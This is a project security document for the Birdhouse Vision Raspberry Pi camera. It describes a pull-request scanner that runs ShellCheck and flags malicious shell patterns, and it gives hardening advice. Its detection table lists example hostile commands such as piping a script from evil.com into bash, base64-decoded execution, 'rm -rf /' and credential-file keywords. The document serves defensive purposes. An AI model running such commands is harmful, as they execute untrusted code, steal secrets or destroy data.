# Security

## Overview

Security is a priority for the Birdhouse Vision project. This document outlines our security measures and practices.

## Automated Security Scanning

### Shell Script Security Workflow

All shell scripts (`.sh` and `.bash` files) are automatically scanned when you create a pull request. The workflow performs two types of checks:

#### 1. ShellCheck Static Analysis

[ShellCheck](https://www.shellcheck.net/) analyzes shell scripts for:
- Syntax errors
- Common mistakes and pitfalls
- Quoting issues
- Variable usage problems
- Best practice violations

**Example issues detected:**
- Unquoted variables that could cause word splitting
- Missing error handling
- Deprecated syntax
- Performance issues

#### 2. Malicious Pattern Detection

A custom security scanner checks for potentially dangerous patterns that could indicate malicious code:

| Pattern Category | What It Detects | Example |
|-----------------|----------------|---------|
| **Remote Code Execution** | Commands that download and execute code | `curl http://evil.com/script.sh \| bash` |
| **Suspicious Downloads** | Silent downloads from HTTP sources | `curl -s http://...` |
| **Base64 Encoded Commands** | Hidden commands in base64 | `echo "..." \| base64 -d \| sh` |
| **Credential Theft** | Accessing sensitive files | `.ssh`, `.aws`, `password`, `secret`, `token` |
| **Data Exfiltration** | Sending data to external servers | `curl -X POST http://...` |
| **System Modification** | Dangerous system commands | `rm -rf /`, `mkfs`, `dd` |
| **Cron Job Manipulation** | Modifying scheduled tasks | `crontab -e`, `/etc/cron.d/` |
| **Persistence Mechanisms** | Adding backdoors | `.bashrc`, `/etc/rc.local` |
| **Obfuscated Commands** | Hidden malicious code | `eval $(...)`, `sh -c $var` |
| **Suspicious URLs** | Connections to IPs or Tor | `http://192.168.1.1`, `.onion` |

### Workflow Behavior

When you create a pull request that modifies shell scripts:

1. ✅ **Automatic trigger**: Workflow runs automatically
2. 🔍 **Script discovery**: Finds all `.sh` and `.bash` files
3. 🛡️ **ShellCheck**: Runs static analysis
4. 🔒 **Pattern scan**: Checks for malicious patterns
5. 💬 **PR comment**: Posts results as a comment
6. ❌ **Block merge**: Fails if issues are found (requires review)

### False Positives

**Important**: This is an automated security tool that may generate false positives.

**Common false positives:**
- Legitimate use of `.ssh` for key-based authentication
- Safe use of `curl` for downloading dependencies
- Proper use of `eval` in specific contexts
- System administration scripts that need elevated permissions

**What to do:**
1. Review the flagged code carefully
2. Understand why the pattern was detected
3. Verify the code is legitimate and safe
4. Add a comment in the PR explaining the false positive
5. A maintainer will review and approve

### Example Workflow Output

**When issues are found:**

```
## 🔒 Shell Script Security Scan Results

### ShellCheck Analysis
✅ **Passed** - No ShellCheck issues found

### Malicious Pattern Detection
⚠️ **Warning** - Potentially malicious patterns detected. See workflow logs for details.

**Action Required**: Please review the shell scripts carefully. The scanner detected patterns that could indicate:
- Remote code execution attempts
- Credential theft
- Data exfiltration
- System modification
- Obfuscated commands

⚠️ **Note**: These are automated checks and may include false positives. Each warning should be manually reviewed.
```

**When no issues are found:**

```
## 🔒 Shell Script Security Scan Results

### ShellCheck Analysis
✅ **Passed** - No ShellCheck issues found

### Malicious Pattern Detection
✅ **Passed** - No suspicious patterns detected
```

## Security Best Practices

### For Contributors

When writing shell scripts for this project:

1. **Use ShellCheck**: Run `shellcheck your-script.sh` before committing
2. **Avoid dangerous patterns**: Don't download and execute code without review
3. **Quote variables**: Always quote variables to prevent injection: `"$var"`
4. **Check inputs**: Validate and sanitize user inputs
5. **Use full paths**: Prefer `/usr/bin/curl` over `curl`
6. **Enable strict mode**: Use `set -euo pipefail` at the start of scripts
7. **Log actions**: Log important operations for audit trails
8. **Handle secrets safely**: Never hardcode credentials
9. **Limit permissions**: Use minimum necessary file permissions
10. **Document intent**: Add comments explaining security-sensitive code

### For Reviewers

When reviewing pull requests with shell scripts:

1. **Check workflow results**: Review the automated security scan output
2. **Verify patterns**: For flagged patterns, verify they're legitimate
3. **Look for context**: Understand the purpose of the script
4. **Check credentials**: Ensure no secrets are hardcoded
5. **Verify paths**: Check that file paths are safe and expected
6. **Test locally**: Run the script in a safe environment if possible
7. **Ask questions**: If something looks suspicious, ask the contributor

## Reporting Security Issues

If you discover a security vulnerability in this project:

1. **DO NOT** open a public GitHub issue
2. Contact the maintainer privately via GitHub Security Advisory
3. Provide details:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)

We will respond within 48 hours and work with you to address the issue.

## Security Updates

This project follows these security practices:

- **Dependency updates**: Regular updates to Python packages and system tools
- **Automated scanning**: Continuous security checks on all PRs
- **Code review**: All changes reviewed before merging
- **Minimal permissions**: Services run with least privilege necessary
- **Network isolation**: Camera Pi uses dedicated network segment

## Raspberry Pi Security

For production deployments:

1. **Change default passwords**: Never use default Raspberry Pi credentials
2. **Update regularly**: Keep Raspberry Pi OS and packages updated
3. **Firewall**: Enable `ufw` and block unnecessary ports
4. **SSH keys only**: Disable password authentication for SSH
5. **Fail2ban**: Install fail2ban to prevent brute force attacks
6. **Disable unnecessary services**: Only run required services
7. **Network segmentation**: Isolate IoT devices from main network
8. **Physical security**: Secure Raspberry Pi devices from physical access

## AWS Security

For AWS integration:

1. **IAM roles**: Use IAM roles instead of access keys when possible
2. **Least privilege**: Grant minimum necessary permissions
3. **Rotate credentials**: Regularly rotate AWS access keys
4. **Monitor usage**: Enable CloudTrail and review logs
5. **Budget alerts**: Set up billing alerts to detect abuse
6. **S3 bucket policies**: Restrict S3 bucket access
7. **Encryption**: Enable encryption at rest for S3 buckets

## License

This security documentation is part of the Birdhouse Vision project and is licensed under the MIT License.
